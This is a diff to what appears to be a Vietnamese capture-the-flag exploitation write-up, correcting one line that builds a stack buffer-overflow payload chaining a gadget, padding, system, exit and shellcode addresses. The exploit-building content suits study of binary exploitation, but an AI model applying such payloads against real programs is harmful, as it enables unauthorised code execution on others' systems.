@@ -153,7 +153,7 @@ Có 3 vị trí thỏa mãn 0x80485f7, 0x80485c7, 0x8048492. Mình chọn cái n
 
 Payload của chúng ta bây giờ là:
 
-`payload = "A" * 80 + addr_gadget + + addr_system + addr_exit + addr_shellcode`
+`payload = "A" * 80 + addr_gadget + "AAAA" + "BBBB" + addr_system + addr_exit + addr_shellcode`
 
 File exp.py
 
